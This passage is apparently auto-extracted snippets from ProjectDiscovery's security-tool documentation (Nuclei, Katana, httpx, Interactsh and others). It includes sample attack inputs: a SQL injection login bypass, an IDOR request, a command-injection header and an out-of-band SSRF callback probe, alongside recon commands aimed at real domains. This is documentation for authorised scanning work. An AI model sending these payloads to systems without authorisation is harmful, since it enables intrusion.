\"Python/3.\"\n    condition: or\n    part: header\n```\n\n----------------------------------------\n\nTITLE: Basic Variables in YAML\nDESCRIPTION: Core variables used in AlterX for subdomain pattern matching, including sub, suffix, tld, and etld variables.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/alterx/running.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n{{sub}}     :  subdomain prefix or left most part of a subdomain\n{{suffix}}  :  everything except {{sub}} in subdomain name is suffix\n{{tld}}     :  top level domain name (ex com,uk,in etc)\n{{etld}}    :  also know as public suffix (ex co.uk , gov.in etc)\n```\n\n----------------------------------------\n\nTITLE: Running Nuclei Race Condition Test with Bash\nDESCRIPTION: Command to run a race condition test template against a target API using Nuclei. This executes the race condition template against the specified target.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/race-conditions.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnuclei -t race.yaml -target https://api.target.com\n```\n\n----------------------------------------\n\nTITLE: Using randstr Preprocessor in Nuclei Template\nDESCRIPTION: Example showing how to use the randstr preprocessor in an HTTP POST request template. The randstr value remains consistent throughout the template execution and can be used in both request headers and matchers.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/preprocessors.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nhttp:\n  - method: POST\n    path:\n      - \"{{BaseURL}}/level1/application/\"\n    headers:\n      cmd: echo '{{randstr}}'\n\n    matchers:\n      - type: word\n        words:\n          - '{{randstr}}'\n```\n\n----------------------------------------\n\nTITLE: Configuring Alibaba Cloud Provider for Cloudlist\nDESCRIPTION: YAML configuration block for integrating Alibaba Cloud with Cloudlist. Requires region ID and access credentials.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: alibaba # provider is the name of the provider\n  # id is the name defined by user for filtering (optional)\n  id: staging\n  # alibaba_region_id is the region id of the resources\n  alibaba_region_id: $ALIBABA_REGION_ID\n  # alibaba_access_key is the access key ID for alibaba cloud account\n  alibaba_access_key: $ALIBABA_ACCESS_KEY\n  # alibaba_access_key_secret is the secret access key for alibaba cloud account\n  alibaba_access_key_secret: $ALIBABA_ACCESS_KEY_SECRET\n```\n\n----------------------------------------\n\nTITLE: Closing SSH Connection in JavaScript\nDESCRIPTION: Closes the SSH connection and destroys the client. Returns a boolean indicating success.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ssh.SSHClient.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst ssh = require('nuclei/ssh');\nconst client = new ssh.SSHClient();\nclient.Connect('acme.com', 22, 'username', 'password');\nconst closed = client.Close();\n```\n\n----------------------------------------\n\nTITLE: Displaying AlterX Help and Options in Console\nDESCRIPTION: This snippet shows the full command-line interface for AlterX, including all available flags and options for input, output, configuration, and updates. It provides details on how to use each flag, their default values, and their purposes.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/alterx/usage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nFast and customizable subdomain wordlist generator using DSL.\n\nUsage:\n  ./alterx [flags]\n\nFlags:\nINPUT:\n   -l, -list string[]     subdomains to use when creating permutations (stdin, comma-separated, file)\n   -p, -pattern string[]  custom permutation patterns input to generate (comma-seperated, file)\n   -pp, -payload value    custom payload pattern input to replace/use in key=value format (-pp 'word=words.txt')\n\nOUTPUT:\n   -es, -estimate      estimate permutation count without generating payloads\n   -o, -output string  output file to write altered subdomain list\n   -ms, -max-size int  Max export data size (kb, mb, gb, tb) (default mb)\n   -v, -verbose        display verbose output\n   -silent             display results only\n   -version            display alterx version\n\nCONFIG:\n   -config string  alterx cli config file (default '$HOME/.config/alterx/config.yaml')\n   -en, -enrich    enrich wordlist by extracting words from input\n   -ac string      alterx permutation config file (default '$HOME/.config/alterx/permutation_v0.0.1.yaml')\n   -limit int      limit the number of results to return (default 0)\n\nUPDATE:\n   -up, -update                 update alterx to latest version\n   -duc, -disable-update-check  disable automatic alterx update check\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Insecure Direct Object Reference (IDOR) Vulnerability in HTTP\nDESCRIPTION: This snippet shows an Insecure Direct Object Reference vulnerability in a user profile page. The application exposes sensitive information of a user who is not the authenticated user, leading to unauthorized access.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/editor/ai.mdx#2025-04-12_snippet_4\n\nLANGUAGE: http\nCODE:\n```\nGET /profile?id=2 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\nCookie: session=abcd1234\n```\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 1337\nServer: Apache\n\n<html>\n...\n<p>Welcome, otheruser</p>\n...\n</html>\n```\n\n----------------------------------------\n\nTITLE: Verifying Nuclei Installation\nDESCRIPTION: Command to verify successful Nuclei installation by displaying the help menu with available options and flags.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/free/nuclei-setup.mdx#2025-04-12_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\nnuclei -h\n```\n\n----------------------------------------\n\nTITLE: Detecting POP3 Server with JavaScript\nDESCRIPTION: Example showing how to use the POP3 detection module to check if a host is running a POP3 server. The function takes a hostname and port number as parameters and returns either a POP3 response object or null.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/pop3.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst pop3 = require('nuclei/pop3');\nconst isPOP3 = pop3.IsPOP3('acme.com', 110);\nlog(toJSON(isPOP3));\n```\n\n----------------------------------------\n\nTITLE: Creating Negative LDAP Filter\nDESCRIPTION: Shows how to create a negative (NOT) version of an existing LDAP filter. Takes a filter string as input and returns its negative counterpart.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.mdx#2025-04-12_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst filter = ldap.NegativeFilter(ldap.FilterIsPerson);\n```\n\n----------------------------------------\n\nTITLE: Declaring Basic Variables in Nuclei\nDESCRIPTION: Example showing how to declare string and DSL function variables in a Nuclei template. Variables are defined at the template level and remain constant throughout execution.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/variables.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nvariables:\n  a1: \"test\" # A string variable\n  a2: \"{{to_lower(rand_base(5))}}\" # A DSL function variable\n```\n\n----------------------------------------\n\nTITLE: DNS Resolving with dnsx in Console\nDESCRIPTION: Examples of using dnsx for DNS resolving, including filtering active hostnames, printing A records, extracting CNAME records, and querying ASN information.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/dnsx/running.mdx#2025-04-12_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nsubfinder -silent -d hackerone.com | dnsx -silent\n```\n\nLANGUAGE: console\nCODE:\n```\nsubfinder -silent -d hackerone.com | dnsx -silent -a -resp\n```\n\nLANGUAGE: console\nCODE:\n```\nsubfinder -silent -d hackerone.com | dnsx -silent -cname -resp\n```\n\nLANGUAGE: console\nCODE:\n```\nsubfinder -silent -d hackerone.com | dnsx -silent  -asn\n```\n\n----------------------------------------\n\nTITLE: DNS Class Type Configuration\nDESCRIPTION: Demonstrates setting the DNS class type, which is typically set to INET for most use cases.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/dns.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nclass: inet\n```\n\n----------------------------------------\n\nTITLE: Network Port Functions in JavaScript\nDESCRIPTION: Functions for handling network ports. 'getNetworkPort' registers and returns a default port, 'isPortOpen' checks if a TCP port is open, and 'isUDPPortOpen' checks if a UDP port is open.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/js-helper-functions.mdx#2025-04-12_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\ngetNetworkPort(port string, defaultPort string) string\nisPortOpen(host string, port string, [timeout int]) bool\nisUDPPortOpen(host string, port string, [timeout int]) bool\n```\n\n----------------------------------------\n\nTITLE: Demonstrating SQL Injection Vulnerability in HTTP\nDESCRIPTION: This snippet demonstrates an SQL Injection vulnerability in a login form. The application improperly handles user input in the password field, allowing for SQL injection attacks.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/editor/ai.mdx#2025-04-12_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nPOST /login HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=' OR '1'='1\n```\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 1337\nServer: Apache\n\n<html>\n...\n<p>Welcome back, admin</p>\n...\n</html>\n```\n\n----------------------------------------\n\nTITLE: Configuring Rate Limit per Minute in Nuclei CLI\nDESCRIPTION: Sets the global rate limit for HTTP requests in Nuclei in terms of requests per minute, alternative to -rl flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\n-rlm <number> or -rate-limit-minute <number>\n```\n\n----------------------------------------\n\nTITLE: Custom Field Configuration in YAML\nDESCRIPTION: Example YAML configuration for defining custom fields with regex patterns for email and phone number extraction\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_23\n\nLANGUAGE: yaml\nCODE:\n```\n- name: email\n  type: regex\n  regex:\n  - '([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)'\n  - '([a-zA-Z0-9+._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)'\n\n- name: phone\n  type: regex\n  regex:\n  - '\\d{3}-\\d{8}|\\d{4}-\\d{7}'\n```\n\n----------------------------------------\n\nTITLE: JARM Fingerprinting\nDESCRIPTION: Demonstrates JARM TLS fingerprinting to identify and categorize servers based on their TLS configurations.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nsubfinder -d hackerone.com -silent | httpx -jarm\n```\n\n----------------------------------------\n\nTITLE: Configuring OpenStack Provider in YAML\nDESCRIPTION: Example configuration block for integrating OpenStack with Cloudlist. Requires OpenStack authentication details including identity endpoint, domain name, tenant name, username, and password.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_17\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: openstack\n  id: staging\n  identity_endpoint: $OS_IDENTITY_ENDPOINT\n  domain_name: $OS_DOMAIN_NAME\n  tenant_name: $OS_TENANT_NAME\n  username: $OS_USERNAME\n  password: $OS_PASSWORD\n```\n\n----------------------------------------\n\nTITLE: Running Katana with Field Scope\nDESCRIPTION: Demonstrates how to use the field scope option to limit crawling to a specific domain name keyword.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -fs dn\n```\n\n----------------------------------------\n\nTITLE: Querying Subdomains with Chaos CLI\nDESCRIPTION: Basic command to enumerate subdomains for a given domain using Chaos. Uses the -d flag to specify the target domain and -silent for clean output.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/chaos/running.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nchaos -d uber.com -silent\n\nrestaurants.uber.com\ntestcdn.uber.com\napprovalservice.uber.com\nzoom-logs.uber.com\neastwood.uber.com\nmeh.uber.com\nwebview.uber.com\nkiosk-api.uber.com\nutmbeta-staging.uber.com\ngetmatched-staging.uber.com\nlogs.uber.com\ndca1.cfe.uber.com\ncn-staging.uber.com\nfrontends-primary.uber.com\neng.uber.com\nguest.uber.com\nkiosk-home-staging.uber.com\n```\n\n----------------------------------------\n\nTITLE: Using Buffer.String() Method in JavaScript\nDESCRIPTION: Demonstrates how to use the String() method to get the string representation of the buffer contents.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/bytes.Buffer.mdx#2025-04-12_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nconst bytes = require('nuclei/bytes');\nconst buffer = new bytes.Buffer();\nbuffer.WriteString('hello');\nlog(buffer.String());\n```\n\n----------------------------------------\n\nTITLE: Checking SMTP Server Availability in JavaScript\nDESCRIPTION: Example showing how to verify if a host is running an SMTP server by checking a specific host and port.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.SMTPClient.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst isSMTP = smtp.IsSMTP('acme.com', 25);\nlog(toJSON(isSMTP));\n```\n\n----------------------------------------\n\nTITLE: Initializing Buffer in JavaScript\nDESCRIPTION: Demonstrates how to create a new Buffer instance using the bytes module. It can be initialized empty or with an existing byte/Uint8Array.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/bytes.Buffer.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst bytes = require('nuclei/bytes');\nconst bytes = new bytes.Buffer();\n```\n\nLANGUAGE: javascript\nCODE:\n```\nconst bytes = require('nuclei/bytes');\n// optionally it can accept existing byte/Uint8Array as input\nconst bytes = new bytes.Buffer([1, 2, 3]);\n```\n\n----------------------------------------\n\nTITLE: Network Protocol Variables Example\nDESCRIPTION: Shows how to use variables in TCP network requests, including static strings and encoded values. Includes configuration for host targeting and data matching.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/variables.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nid: variables-example\n\ninfo:\n  name: Variables Example\n  author: pdteam\n  severity: info\n\nvariables:\n  a1: \"PING\"\n  a2: \"{{base64('hello')}}\"\n\ntcp:\n  - host: \n      - \"{{Hostname}}\"\n    inputs:\n      - data: \"{{a1}}\"\n    read-size: 8\n    matchers:\n      - type: word\n        part: data\n        words:\n          - \"{{a2}}\"\n```\n\n----------------------------------------\n\nTITLE: Using System Chrome for Screenshots with httpx in Bash\nDESCRIPTION: This command demonstrates how to use the locally installed system Chrome for taking screenshots with httpx instead of the default go-rod managed Chrome.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\nhttpx -screenshot -system-chrome -u https://example.com\n```\n\n----------------------------------------\n\nTITLE: DNS Name Configuration with Variables\nDESCRIPTION: Shows how to configure the DNS name to resolve, using dynamic variables like FQDN that get replaced at runtime.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/dns.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nname: {{FQDN}}.com\n```\n\n----------------------------------------\n\nTITLE: Implementing Interactsh URL Placeholder in HTTP Request\nDESCRIPTION: Demonstrates how to use the {{interactsh-url}} placeholder in a raw HTTP GET request for OOB testing.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/oob-testing.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n  - raw:\n      - |\n        GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1\n        Host: {{Hostname}}\n```\n\n----------------------------------------\n\nTITLE: Using Buffer.Pack() Method in JavaScript\nDESCRIPTION: Shows how to use the Pack() method to pack data into the buffer according to a specified format string.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/bytes.Buffer.mdx#2025-04-12_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nconst bytes = require('nuclei/bytes');\nconst buffer = new bytes.Buffer();\nbuffer.Pack('I', 123);\n```\n\n----------------------------------------\n\nTITLE: Configuring Retries in Nuclei CLI\nDESCRIPTION: Sets the maximum number of retries Nuclei should attempt for a request, useful for unstable network conditions.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\n-retries <number>\n```\n\n----------------------------------------\n\nTITLE: Setting SSH Connection Timeout in JavaScript\nDESCRIPTION: Sets the timeout for the SSH connection in seconds.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ssh.SSHClient.mdx#2025-04-12_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nconst ssh = require('nuclei/ssh');\nconst client = new ssh.SSHClient();\nclient.SetTimeout(10);\n```\n\n----------------------------------------\n\nTITLE: Running Katana with Multiple URL Inputs\nDESCRIPTION: Shows how to provide multiple URLs to Katana using comma-separated values.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nkatana -u https://tesla.com,https://google.com\n```\n\n----------------------------------------\n\nTITLE: Signing Template with Nuclei\nDESCRIPTION: Demonstrates the command to sign a template using the -sign flag and displays success/failure count.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/template-signing.mdx#2025-04-12_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n$ ./nuclei -t templates.yaml -sign\n[INF] All templates signatures were elaborated success=1 failed=0\n```\n\n----------------------------------------\n\nTITLE: Defining Regex Extractor with Match Group in YAML for Nuclei\nDESCRIPTION: Example of a regex extractor with a specific match group to extract a CSRF token from the response body.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/extractors.mdx#2025-04-12_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nextractors:\n  - type: regex  # type of extractor\n    name: csrf_token # defining the variable name\n    part: body # part of response to look for\n    # group defines the matching group being used. \n    # In GO the \"match\" is the full array of all matches and submatches \n    # match[0] is the full match\n    # match[n] is the submatches. Most often we'd want match[1] as depicted below\n    group: 1\n    regex:\n      - '<input\\sname=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\"\\s/>'\n```\n\n----------------------------------------\n\nTITLE: Running Responder Service in Interactsh\nDESCRIPTION: Command to start Interactsh server with Responder service enabled.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/server.mdx#2025-04-12_snippet_14\n\nLANGUAGE: console\nCODE:\n```\n$ sudo interactsh-server -responder -d localhost\n```\n\n----------------------------------------\n\nTITLE: Checking for MS SQL Database on Host in JavaScript\nDESCRIPTION: Verifies if the given host is running an MS SQL database on the specified port. Returns a boolean indicating the presence of MS SQL.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mssql.MSSQLClient.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst mssql = require('nuclei/mssql');\nconst isMssql = mssql.IsMssql('acme.com', 1433);\n```\n\n----------------------------------------\n\nTITLE: Asset Discovery with Subfinder\nDESCRIPTION: Command to discover subdomains of a target domain using Subfinder. This tool uses passive sources to enumerate subdomains and save the results to a text file.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/quickstart/index.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nsubfinder -d example.com -o subdomains.txt\n```\n\n----------------------------------------\n\nTITLE: Using Buffer.Bytes() Method in JavaScript\nDESCRIPTION: Shows how to use the Bytes() method to get the byte representation of the buffer. This method returns a Uint8Array.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/bytes.Buffer.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst bytes = require('nuclei/bytes');\nconst buffer = new bytes.Buffer();\nbuffer.WriteString('hello');\nlog(buffer.Bytes());\n```\n\n----------------------------------------\n\nTITLE: Initializing and Setting IKENonce in JavaScript\nDESCRIPTION: This snippet demonstrates how to import the ikev2 module, create a new IKENonce instance, and set its NonceData property. The NonceData is set as an array of numbers representing the nonce data.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ikev2.IKENonce.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst ikev2 = require('nuclei/ikev2');\nconst nonce = new ikev2.IKENonce();\nnonce.NonceData = [1, 2, 3];\n```\n\n----------------------------------------\n\nTITLE: Operating System Detection Functions in JavaScript\nDESCRIPTION: Functions for detecting the current operating system. Includes checks for various OS types like Linux, Windows, OSX, Android, iOS, FreeBSD, OpenBSD, and Solaris.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/js-helper-functions.mdx#2025-04-12_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nOS() string\nIsLinux() bool\nIsWindows() bool\nIsOSX() bool\nIsAndroid() bool\nIsIOS() bool\nIsJS() bool\nIsFreeBSD() bool\nIsOpenBSD() bool\nIsSolaris() bool\n```\n\n----------------------------------------\n\nTITLE: Decoding SID with LDAP Module\nDESCRIPTION: Demonstrates how to decode a Security Identifier (SID) string using the LDAP module. Takes a SID string as input and returns the decoded format.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst sid = ldap.DecodeSID('S-1-5-21-3623811015-3361044348-30300820-1013');\nlog(sid);\n```\n\n----------------------------------------\n\nTITLE: Enabling Streaming Mode in Nuclei CLI\nDESCRIPTION: Activates continuous streaming of inputs to Nuclei instead of waiting for probe to finish, potentially affecting memory usage.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\n-stream\n```\n\n----------------------------------------\n\nTITLE: Naabu JSON Output in Bash\nDESCRIPTION: Scan a specific IP address (104.16.99.52) with Naabu and output the results in JSON format.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/naabu/running.mdx#2025-04-12_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nnaabu -host 104.16.99.52 -json\n```\n\n----------------------------------------\n\nTITLE: Initializing Headless Protocol in Nuclei YAML\nDESCRIPTION: This snippet shows how to start the headless protocol section in a Nuclei template. It defines the beginning of the headless browser automation configuration.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/headless.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Start the requests for the template right here\nheadless:\n```\n\n----------------------------------------\n\nTITLE: Defining Template ID in YAML\nDESCRIPTION: Shows how to specify a unique identifier for a Nuclei template. The ID must not contain spaces to allow easier output parsing.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/structure.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: git-config\n```\n\n----------------------------------------\n\nTITLE: File Input Probing\nDESCRIPTION: Shows how to probe hosts from a file input to determine their HTTP/HTTPS accessibility status.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nhttpx -list hosts.txt -silent -probe\n```\n\n----------------------------------------\n\nTITLE: Skipping Secret File Configuration in Nuclei Template\nDESCRIPTION: Example YAML template demonstrating how to skip secret file authentication using the skip-secret-file option while using hardcoded credentials.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/authenticated-scans.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nvariables:\n  username: foo\n  password: bar\n\nhttp:\n  - raw:\n      - |\n        GET /some-restricted-page HTTP/1.1\n        Host: {{Hostname}}\n        Accept: application/json\n        Authorization: Basic {{base64(concat(username, \":\", password))}}\n\n    skip-secret-file: true\n```\n\n----------------------------------------\n\nTITLE: Enabling Profiling in Nuclei\nDESCRIPTION: Activates profiling in Nuclei for performance analysis, collecting CPU and memory profiles at specified intervals.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\nPPROF=1 PPROF_TIME=10s nuclei <other_flags>\n```\n\n----------------------------------------\n\nTITLE: Logging and Debugging Functions in JavaScript\nDESCRIPTION: Functions for logging and debugging. 'log' prints input to stdout with a [JS] prefix for debugging purposes.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/js-helper-functions.mdx#2025-04-12_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nlog(msg string)\nlog(msg map[string]interface{})\n```\n\n----------------------------------------\n\nTITLE: Piping Naabu Output to httpx in Bash\nDESCRIPTION: Use Naabu to scan ports on hackerone.com and pipe the results to httpx for further HTTP server discovery.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/naabu/running.mdx#2025-04-12_snippet_5\n\nLANGUAGE: console\nCODE:\n```\necho hackerone.com | naabu -silent | httpx -silent\n```\n\n----------------------------------------\n\nTITLE: Running Katana with STDIN Input\nDESCRIPTION: Demonstrates how to use piped input (stdin) to provide URLs to Katana.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\necho https://tesla.com | katana\n```\n\nLANGUAGE: sh\nCODE:\n```\ncat domains | httpx | katana\n```\n\n----------------------------------------\n\nTITLE: Initializing TelnetClient\nDESCRIPTION: Example showing how to initialize a new TelnetClient instance using the nuclei/telnet module.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/telnet.TelnetClient.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst telnet = require('nuclei/telnet');\nconst client = new telnet.Client();\n```\n\n----------------------------------------\n\nTITLE: Initializing MSSQLClient in JavaScript\nDESCRIPTION: Creates a new instance of the MSSQLClient class for interacting with MS SQL databases.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mssql.MSSQLClient.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst mssql = require('nuclei/mssql');\nconst client = new mssql.MSSQLClient;\n```\n\n----------------------------------------\n\nTITLE: Rate Limiting Configuration in Katana\nDESCRIPTION: Shows various options for controlling crawler rate limits including delay, concurrency, and request limits.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_28\n\nLANGUAGE: shell\nCODE:\n```\nkatana -u https://tesla.com -delay 20\nkatana -u https://tesla.com -c 20\nkatana -u https://tesla.com -p 20\nkatana -u https://tesla.com -rl 100\nkatana -u https://tesla.com -rlm 500\n```\n\n----------------------------------------\n\nTITLE: Setting Timeout for Kerberos Client in JavaScript\nDESCRIPTION: Example of how to create a Kerberos Config object and set the read/write timeout. This configures how long the Kerberos client will wait for responses before timing out.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.Config.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst kerberos = require('nuclei/kerberos');\nconst cfg = new kerberos.Config();\ncfg.SetTimeout(5);\n```\n\n----------------------------------------\n\nTITLE: Initializing SSHClient in JavaScript\nDESCRIPTION: Creates a new instance of the SSHClient class from the ssh module.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ssh.SSHClient.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst ssh = require('nuclei/ssh');\nconst client = new ssh.SSHClient();\n```\n\n----------------------------------------\n\nTITLE: Building MySQL DSN in JavaScript\nDESCRIPTION: Demonstrates how to use the BuildDSN function to create a MySQL data source name (DSN) from given options. It requires the 'nuclei/mysql' module and uses the MySQLOptions class to set connection parameters.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mysql.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst mysql = require('nuclei/mysql');\nconst options = new mysql.MySQLOptions();\noptions.Host = 'acme.com';\noptions.Port = 3306;\nconst dsn = mysql.BuildDSN(options);\n```\n\n----------------------------------------\n\nTITLE: Running Katana with Out-of-Scope Rules\nDESCRIPTION: Demonstrates how to exclude specific paths or patterns from crawling using the out-of-scope option.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -cos logout\n```\n\n----------------------------------------\n\nTITLE: Running Code Templates with Nuclei Command\nDESCRIPTION: Command line syntax for executing Nuclei templates with code protocol enabled. The -code flag is required to allow code execution for security reasons.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/code.mdx#2025-04-12_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\nnuclei -t code-template.yaml -code\n```\n\n----------------------------------------\n\nTITLE: Creating Info Block in YAML\nDESCRIPTION: Demonstrates how to create an information block containing template metadata including name, author, severity, description, references, and tags. This block provides essential context about the template's purpose and classification.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/structure.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ninfo:\n  name: Git Config File Detection Template\n  author: Ice3man\n  severity: medium\n  